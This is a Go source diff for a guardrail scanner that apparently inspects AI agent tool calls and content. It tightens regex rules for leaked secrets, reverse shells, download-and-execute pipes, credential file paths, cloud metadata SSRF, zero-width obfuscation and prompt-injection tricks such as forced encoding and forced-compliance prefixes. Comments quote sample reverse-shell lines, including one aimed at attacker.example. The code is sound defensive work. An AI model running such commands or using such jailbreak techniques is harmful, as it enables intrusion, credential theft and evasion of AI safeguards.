@@ -46,6 +46,11 @@ type RuleFinding struct {
 	Confidence float64  `json:"confidence"`
 	Evidence   string   `json:"evidence,omitempty"`
 	Tags       []string `json:"tags,omitempty"`
+	// ToolCapabilityClass is set for tool-call inspection findings
+	// from the invoked tool's name (via guardrail.ClassifyToolName).
+	// Empty for content-only matches; the emission pipeline then
+	// falls back to a rule-id-based capability (CapabilityForRuleID).
+	ToolCapabilityClass string `json:"tool_capability_class,omitempty"`
 }
 
 // ---------------------------------------------------------------------------
@@ -66,15 +71,15 @@ var secretRules = []PatternRule{
 	{ID: "SEC-GITHUB-TOKEN", Pattern: regexp.MustCompile(`(?:ghp_|gho_|ghu_|ghs_|ghr_)[a-zA-Z0-9]{36,}`), Title: "GitHub token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
 	{ID: "SEC-GITHUB-PAT", Pattern: regexp.MustCompile(`github_pat_[a-zA-Z0-9_]{22,}`), Title: "GitHub fine-grained PAT", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
 	{ID: "SEC-GITLAB", Pattern: regexp.MustCompile(`glpat-[a-zA-Z0-9\-_]{20,}`), Title: "GitLab personal access token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-GOOGLE", Pattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`), Title: "Google API key", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-SLACK-TOKEN", Pattern: regexp.MustCompile(`xox[bpors]-[0-9a-zA-Z\-]{10,}`), Title: "Slack token", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-SLACK-WEBHOOK", Pattern: regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+`), Title: "Slack webhook URL", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-DISCORD-WEBHOOK", Pattern: regexp.MustCompile(`https://discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_\-]+`), Title: "Discord webhook URL", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential"}},
+	{ID: "SEC-GOOGLE", Pattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`), Title: "Google API key", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
+	{ID: "SEC-SLACK-TOKEN", Pattern: regexp.MustCompile(`xox[bpors]-[0-9a-zA-Z\-]{10,}`), Title: "Slack token", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
+	{ID: "SEC-SLACK-WEBHOOK", Pattern: regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+`), Title: "Slack webhook URL", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
+	{ID: "SEC-DISCORD-WEBHOOK", Pattern: regexp.MustCompile(`https://discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_\-]+`), Title: "Discord webhook URL", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
 	{ID: "SEC-PRIVKEY", Pattern: regexp.MustCompile(`-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----`), Title: "Private key", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential"}},
 	{ID: "SEC-JWT", Pattern: regexp.MustCompile(`eyJ[A-Za-z0-9\-_]{10,}\.eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_.+/=]+`), Title: "JWT token", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"credential"}},
-	{ID: "SEC-CONNSTR", Pattern: regexp.MustCompile(`(?:mongodb|postgres|mysql|redis|amqp)://[^:\s]+:[^@\s]+@`), Title: "Connection string with credentials", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential"}},
+	{ID: "SEC-CONNSTR", Pattern: regexp.MustCompile(`(?:mongodb|postgres|mysql|redis|amqp)://[^:\s]+:[^@\s]+@`), Title: "Connection string with credentials", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
 	{ID: "SEC-BEARER", Pattern: regexp.MustCompile(`(?i)(?:authorization|bearer)\s*[:=]\s*Bearer\s+[A-Za-z0-9\-_.~+/]+=*`), Title: "Bearer token in header", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
-	{ID: "SEC-SENDGRID", Pattern: regexp.MustCompile(`SG\.[a-zA-Z0-9\-_]{10,}\.[a-zA-Z0-9\-_]{10,}`), Title: "SendGrid API key", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential"}},
+	{ID: "SEC-SENDGRID", Pattern: regexp.MustCompile(`SG\.[a-zA-Z0-9\-_]{10,}\.[a-zA-Z0-9\-_]{10,}`), Title: "SendGrid API key", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
 	{ID: "SEC-TWILIO", Pattern: regexp.MustCompile(`SK[0-9a-fA-F]{32}`), Title: "Twilio API key", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
 	{ID: "SEC-NPM-TOKEN", Pattern: regexp.MustCompile(`npm_[a-zA-Z0-9]{36,}`), Title: "npm access token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
 	{ID: "SEC-PYPI-TOKEN", Pattern: regexp.MustCompile(`pypi-[A-Za-z0-9\-_]{50,}`), Title: "PyPI API token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
@@ -92,13 +97,24 @@ var secretRules = []PatternRule{
 var commandRules = []PatternRule{
 	// Reverse shells and bind shells
 	{ID: "CMD-REVSHELL-BASH", Pattern: regexp.MustCompile(`(?i)bash\s+-i\s+>&\s*/dev/tcp/`), Title: "Bash reverse shell", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"execution", "reverse-shell"}},
-	{ID: "CMD-REVSHELL-DEVTCP", Pattern: regexp.MustCompile(`/dev/tcp/\d{1,3}\.\d{1,3}`), Title: "Reverse shell via /dev/tcp", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	{ID: "CMD-REVSHELL-NC", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)`), Title: "Netcat reverse shell with -e", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
+	// Closes avarice F-1729: bash /dev/tcp also accepts hostnames
+	// (e.g. exec 5<>/dev/tcp/attacker.example/4444). Match either a
+	// dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
+	// followed by `/<port>`. Hostname branch demands at least one
+	// `.` to limit FPs against benign /dev/tcp/<service> fragments.
+	{ID: "CMD-REVSHELL-DEVTCP", Pattern: regexp.MustCompile(`/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b`), Title: "Reverse shell via /dev/tcp", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
+	// Closes avarice F-1728: matches BOTH `-e`/`--exec` orderings:
+	//   destination-first:  nc 1.2.3.4 4444 -e /bin/sh
+	//   flag-first:         nc -e /bin/sh 1.2.3.4 4444
+	{ID: "CMD-REVSHELL-NC", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)`), Title: "Netcat reverse shell with -e", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
 	{ID: "CMD-REVSHELL-PYTHON", Pattern: regexp.MustCompile(`(?i)python[23]?\s+-c\s+.*socket.*connect`), Title: "Python reverse shell", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"execution", "reverse-shell"}},
 	// Piped execution — download and run
-	{ID: "CMD-PIPE-CURL", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+[^|]*\|\s*(?:ba)?sh\b`), Title: "curl piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
-	{ID: "CMD-PIPE-WGET", Pattern: regexp.MustCompile(`(?i)\bwget\b\s+[^|]*\|\s*(?:ba)?sh\b`), Title: "wget piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
-	{ID: "CMD-PIPE-BASE64", Pattern: regexp.MustCompile(`(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:ba)?sh\b`), Title: "base64 decode piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "obfuscation"}},
+	// Closes avarice F-1767: also match absolute shell paths like
+	// `/bin/sh`, `/bin/bash`, `/usr/bin/zsh`, plus the bare
+	// `sh`/`bash`/`zsh` forms. Mirrors policies/guardrail/{default,strict}/rules/commands.yaml.
+	{ID: "CMD-PIPE-CURL", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "curl piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
+	{ID: "CMD-PIPE-WGET", Pattern: regexp.MustCompile(`(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "wget piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
+	{ID: "CMD-PIPE-BASE64", Pattern: regexp.MustCompile(`(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "base64 decode piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "obfuscation"}},
 	// Dynamic code execution
 	{ID: "CMD-EVAL", Pattern: regexp.MustCompile(`(?i)\beval\s+["'\$\(]`), Title: "Shell eval with dynamic input", Severity: "HIGH", Confidence: 0.85, Tags: []string{"execution"}},
 	{ID: "CMD-BASH-C", Pattern: regexp.MustCompile(`(?i)\b(?:ba)?sh\s+-c\s+`), Title: "Shell -c execution", Severity: "LOW", Confidence: 0.55, Tags: []string{"execution"}},
@@ -116,13 +132,13 @@ var commandRules = []PatternRule{
 	// System file manipulation
 	{ID: "CMD-ETC-WRITE", Pattern: regexp.MustCompile(`(?i)>\s*/etc/`), Title: "Write redirect to /etc/", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"system-file"}},
 	{ID: "CMD-CRONTAB", Pattern: regexp.MustCompile(`(?i)\bcrontab\s+(?:-[a-zA-Z]\s+)*(?:-e|-r|-l|/|['"<>|])`), Title: "Crontab modification", Severity: "HIGH", Confidence: 0.75, Tags: []string{"persistence"}},
-	{ID: "CMD-SYSTEMCTL", Pattern: regexp.MustCompile(`(?i)\bsystemctl\s+enable\b(?:\s+--now\b)?\s+\S*(?:backdoor|payload|persist|reverse|shell|evil)\S*(?:\.service)?\b`), Title: "Suspicious systemd persistence enablement", Severity: "HIGH", Confidence: 0.82, Tags: []string{"persistence"}},
+	{ID: "CMD-SYSTEMCTL", Pattern: regexp.MustCompile(`(?i)\bsystemctl\s+enable\b(?:\s+--now\b)?\s+\S*(?:backdoor|payload|persist|reverse|shell|evil)\S*(?:\.service)?\b`), Title: "Suspicious systemd persistence enablement", Severity: "CRITICAL", Confidence: 0.82, Tags: []string{"persistence"}},
 	// Network reconnaissance
 	{ID: "CMD-NETCAT-LISTEN", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*)*-?l`), Title: "Netcat listener", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "reverse-shell"}},
 	{ID: "CMD-CURL-UPLOAD", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+.*(?:--upload-file|-T\s|--data\s+@|-F\s+.*=@)`), Title: "curl file upload", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "exfiltration"}},
 	{ID: "CMD-WGET-POST", Pattern: regexp.MustCompile(`(?i)\bwget\b\s+.*--post-(?:data|file)`), Title: "wget POST data exfil", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "exfiltration"}},
 	{ID: "CMD-SOCAT-EXEC", Pattern: regexp.MustCompile(`(?i)\bsocat\b\s+.*\bEXEC\b`), Title: "socat with EXEC (reverse shell)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	{ID: "CMD-ENV-DUMP", Pattern: regexp.MustCompile(`(?:^|[\s;|&])(?:env|printenv|export\s+-p)\b`), Title: "Environment variable dump", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
+	{ID: "CMD-ENV-DUMP", Pattern: regexp.MustCompile(`(?:^|[^A-Za-z0-9_./-])(?:env|printenv|export\s+-p)\b`), Title: "Environment variable dump", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
 }
 
 // ---------------------------------------------------------------------------
@@ -133,19 +149,34 @@ var commandRules = []PatternRule{
 // matching ".env").
 // ---------------------------------------------------------------------------
 
+// Every credential-file rule below shares the home-prefix sub-pattern
+// `(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)`. It matches `~`, the bare and
+// braced shell forms `$HOME` and `${HOME}`, Linux `/home/<user>` and `/root`,
+// and macOS `/Users/<user>`. The brace tolerance (`\{?...\}?`) is required
+// because the previous patterns missed `${HOME}/.aws/credentials` and
+// normalizeShell would strip the variable entirely, leaving only
+// `/.aws/credentials`, which also failed to match. The macOS `/Users/<user>`
+// branch is required because the run_command tool expands `~` via the shell
+// BEFORE the regex sees it, so on macOS the command line arrives as
+// /Users/<user>/.ssh/... rather than the literal ~/.ssh/... These compiled-in
+// defaults must stay in lockstep with the externalized packs under
+// policies/guardrail/<pack>/rules/sensitive-paths.yaml, which replace this
+// category once a rule pack is installed.
 var sensitivePathRules = []PatternRule{
-	{ID: "PATH-SSH-DIR", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.ssh/`), Title: "SSH directory access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-SSH-KEY", Pattern: regexp.MustCompile(`(?i)(?:^|[\\/])id_(?:rsa|ed25519|ecdsa|dsa)(?:\.pub)?\b`), Title: "SSH key file path", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-AWS-CREDS", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.aws/credentials`), Title: "AWS credentials file", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-AWS-CONFIG", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.aws/config`), Title: "AWS config file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-KUBE", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.kube/config`), Title: "Kubernetes config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-DOCKER", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.docker/config\.json`), Title: "Docker config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-GNUPG", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.gnupg/`), Title: "GPG keyring access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-NPMRC", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.npmrc`), Title: "npm config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-PYPIRC", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.pypirc`), Title: "PyPI config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-GIT-CREDS", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.git-credentials`), Title: "Git credentials file", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-NETRC", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.netrc`), Title: "netrc credentials file", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-ENV-FILE", Pattern: regexp.MustCompile(`(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?\s*["'\s,\]})]*$|(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?["'\s,\]})]`), Title: "Environment file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-SSH-DIR", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.ssh/`), Title: "SSH directory access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-SSH-KEY", Pattern: regexp.MustCompile(`(?i)(?:^|[\\/])id_(?:rsa|ed25519|ecdsa|dsa)(?:$|[^A-Za-z0-9_.-])`), Title: "SSH private key file path", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-AWS-CREDS", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.aws/credentials`), Title: "AWS credentials file", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-AWS-CONFIG", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.aws/config`), Title: "AWS config file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-KUBE", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.kube/config`), Title: "Kubernetes config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-DOCKER", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.docker/config\.json`), Title: "Docker config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-GNUPG", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.gnupg/`), Title: "GPG keyring access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-NPMRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.npmrc`), Title: "npm config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-PYPIRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.pypirc`), Title: "PyPI config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-GIT-CREDS", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.git-credentials`), Title: "Git credentials file", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-NETRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.netrc`), Title: "netrc credentials file", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
+	// `;` (shell command separator) is included in the suffix delimiter classes
+	// so `cat .env; true` also matches.
+	{ID: "PATH-ENV-FILE", Pattern: regexp.MustCompile(`(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?\s*["'\s,;\]})]*$|(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?["'\s,;\]})]`), Title: "Environment file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
 	// The /etc/{passwd,shadow,sudoers} rules tolerate common obfuscations:
 	// canonical "/etc/passwd", space-separated "etc passwd", backslash
 	// "etc\passwd", spelled-out "etc slash passwd", and URL-encoded
@@ -158,8 +189,8 @@ var sensitivePathRules = []PatternRule{
 	{ID: "PATH-ETC-PASSWD", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?pas{1,4}wd\b|\betc%2Fpas{1,4}wd\b)`), Title: "/etc/passwd access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"system-file"}},
 	{ID: "PATH-ETC-SHADOW", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?shadow\b|\betc%2Fshadow\b)`), Title: "/etc/shadow access", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"system-file", "credential"}},
 	{ID: "PATH-ETC-SUDOERS", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?sudoers\b|\betc%2Fsudoers\b)`), Title: "/etc/sudoers access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"system-file", "privilege"}},
-	{ID: "PATH-PROC-ENVIRON", Pattern: regexp.MustCompile(`/proc/(?:\d+|self)/environ`), Title: "/proc environ access", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "PATH-HISTORY", Pattern: regexp.MustCompile(`(?:~|\$HOME|/home/\w+|/root)/\.(?:bash_history|zsh_history|python_history)`), Title: "Shell history file", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
+	{ID: "PATH-PROC-ENVIRON", Pattern: regexp.MustCompile(`/proc/(?:\d+|self)/environ`), Title: "/proc environ access", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
+	{ID: "PATH-HISTORY", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.(?:bash_history|zsh_history|python_history)`), Title: "Shell history file", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
 }
 
 // ---------------------------------------------------------------------------
@@ -182,7 +213,9 @@ var c2Rules = []PatternRule{
 	{ID: "C2-PASTEBIN", Pattern: regexp.MustCompile(`(?i)pastebin\.com/raw/`), Title: "Pastebin raw fetch", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"exfiltration", "c2"}},
 	// Cloud metadata endpoints (SSRF)
 	{ID: "C2-METADATA-AWS", Pattern: regexp.MustCompile(`169\.254\.169\.254`), Title: "AWS metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	{ID: "C2-METADATA-GCP", Pattern: regexp.MustCompile(`metadata\.google\.internal`), Title: "GCP metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
+	// Closes avarice F-1725: case-insensitive so uppercase DNS host
+	// variants (METADATA.GOOGLE.INTERNAL) cannot bypass the rule.
+	{ID: "C2-METADATA-GCP", Pattern: regexp.MustCompile(`(?i)metadata\.google\.internal`), Title: "GCP metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
 	{ID: "C2-METADATA-AZURE", Pattern: regexp.MustCompile(`169\.254\.169\.254/metadata`), Title: "Azure metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
 	{ID: "C2-METADATA-HEX", Pattern: regexp.MustCompile(`(?i)0xa9fea9fe`), Title: "AWS metadata endpoint (hex-encoded SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
 	{ID: "C2-METADATA-DECIMAL", Pattern: regexp.MustCompile(`(?:^|[/])2852039166(?:$|[/])`), Title: "AWS metadata endpoint (decimal-encoded SSRF)", Severity: "CRITICAL", Confidence: 0.93, Tags: []string{"ssrf", "credential"}},
@@ -248,6 +281,15 @@ var trustExploitRules = []PatternRule{
 	{ID: "TRUST-OUTPUT-CONSTRAINT", Pattern: regexp.MustCompile(`(?i)(?:respond\s+only\s+in\s+(?:hex|base64|rot13|binary|morse|unicode)|encode\s+your\s+(?:response|answer|output)\s+in\s+(?:base64|hex|rot13|url)|output\s+as\s+(?:hex|base64|rot13|url)\s+encoded|(?:rot13|unicode\s+escape|url\s+(?:decode|encode))\s+(?:the|your|this))`), Title: "Forced encoding to bypass filters", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection", "obfuscation"}},
 	// Payload splitting — "start with" technique to seed compliant-looking output
 	{ID: "TRUST-PAYLOAD-SPLIT", Pattern: regexp.MustCompile(`(?i)(?:start\s+your\s+(?:response|answer|output)\s+with\s+["'](?:Sure|Absolutely|Of\s+course|Here\s+is|I\s+can\s+help))|(?:begin\s+by\s+saying\s+["'](?:Sure|Yes|Absolutely))`), Title: "Payload splitting / forced compliance prefix", Severity: "HIGH", Confidence: 0.87, Tags: []string{"prompt-injection"}},
+	// Zero-width character obfuscation — 10+ occurrences of an ASCII
+	// alphanumeric immediately followed by a zero-width character (U+200B
+	// ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM). Two constraints keep this
+	// rule specific: (1) the 10-occurrence threshold is a high bar — a
+	// hand-spliced SSN crosses it, benign text does not; (2) the ASCII
+	// adjacency filter excludes emoji ZWJ sequences (which sit between
+	// non-ASCII emoji glyphs). The pattern catches the attacker technique
+	// of splicing entity values so entity extractors read garbled tokens.
+	{ID: "OBFUSC-UNICODE-ZWSP", Pattern: regexp.MustCompile(`(?:[A-Za-z0-9][\x{200B}\x{200C}\x{200D}\x{FEFF}][\s\S]*?){10,}`), Title: "Zero-width character obfuscation", Severity: "HIGH", Confidence: 0.95, Tags: []string{"obfuscation"}},
 }
 
 // ---------------------------------------------------------------------------
@@ -278,7 +320,21 @@ var defaultRuleCategories = []ruleCategory{
 // allRuleCategories groups all rule slices for iteration. Seeded from the
 // compiled-in defaults; a rule pack can override individual categories by
 // name via ApplyRulePackOverrides without removing the others.
+//
+// In single-connector mode this is the one active rule set (the connector's
+// pack, or the compiled-in defaults). In multi-connector mode it is the
+// fallback used by ScanAllRulesForConnector when a connector has no
+// dedicated set registered.
 var allRuleCategories = append([]ruleCategory(nil), defaultRuleCategories...)
+
+// connectorRuleCategories holds a per-connector compiled rule set so each
+// connector scans against its own EffectiveRulePackDir at runtime — the same
+// behavior single-connector installs get, lifted to N connectors. Populated
+// at boot by ApplyConnectorRulePackOverrides (one entry per connector that
+// resolved a pack). A connector with no entry falls back to
+// allRuleCategories, so this map is purely additive and leaves the
+// single-connector path untouched. Guarded by ruleCategoriesMu.
+var connectorRuleCategories = map[string][]ruleCategory{}
 
 // ApplyRulePackOverrides replaces the hardcoded rule categories with rules
 // loaded from the rule-pack's rules/*.yaml files. Each YAML file becomes
@@ -328,22 +384,68 @@ func ApplyRulePackOverrides(rp *guardrail.RulePack) {
 		return
 	}
 
-	merged := make([]ruleCategory, len(defaultRuleCategories))
+	merged, overridden, added := mergeRulePackCategories(rp)
+
+	ruleCategoriesMu.Lock()
+	allRuleCategories = merged
+	ruleCategoriesMu.Unlock()
+	fmt.Fprintf(os.Stderr, "[guardrail] rule pack merged: %d categories overridden, %d added, %d defaults retained\n",
+		overridden, added, len(defaultRuleCategories)-overridden)
+}
+
+// ApplyConnectorRulePackOverrides registers a connector-scoped rule set built
+// from that connector's effective rule pack. This is the multi-connector
+// analogue of ApplyRulePackOverrides: instead of mutating the single process
+// global, it stores the merged set keyed by connector so each connector's
+// hook lane scans against its own pack (closing the "primary wins" gap).
+//
+// Called once per connector at boot. A nil/empty pack still registers an
+// entry equal to the compiled-in defaults so the connector is explicitly
+// pinned to a known set rather than inheriting whatever the primary happened
+// to install. Connectors with no entry fall back to allRuleCategories via
+// ScanAllRulesForConnector. Empty connector names are ignored.
+func ApplyConnectorRulePackOverrides(connector string, rp *guardrail.RulePack) {
+	connector = strings.TrimSpace(connector)
+	if connector == "" {
+		return
+	}
+
+	merged, overridden, added := mergeRulePackCategories(rp)
+
+	ruleCategoriesMu.Lock()
+	connectorRuleCategories[connector] = merged
+	ruleCategoriesMu.Unlock()
+	fmt.Fprintf(os.Stderr, "[guardrail] connector %s rule set: %d categories overridden, %d added, %d defaults retained\n",
+		connector, overridden, added, len(defaultRuleCategories)-overridden)
+}
+
+// mergeRulePackCategories builds a full rule-category slice by merging the
+// rule-pack's rule files onto the compiled-in defaults. It is pure — it never
+// touches package globals — so both the single-connector global path
+// (ApplyRulePackOverrides) and the per-connector store
+// (ApplyConnectorRulePackOverrides) share identical merge semantics. A nil
+// pack or one with no rule files yields a copy of defaultRuleCategories.
+func mergeRulePackCategories(rp *guardrail.RulePack) (merged []ruleCategory, overridden, added int) {
+	merged = make([]ruleCategory, len(defaultRuleCategories))
 	copy(merged, defaultRuleCategories)
+	if rp == nil || len(rp.RuleFiles) == 0 {
+		return merged, 0, 0
+	}
 
 	idx := make(map[string]int, len(merged))
 	for i, c := range merged {
 		idx[c.Name] = i
 	}
 
-	overridden := 0
-	added := 0
 	for _, rf := range rp.RuleFiles {
 		if rf == nil || rf.Category == "" {
 			continue
 		}
 		var compiled []PatternRule
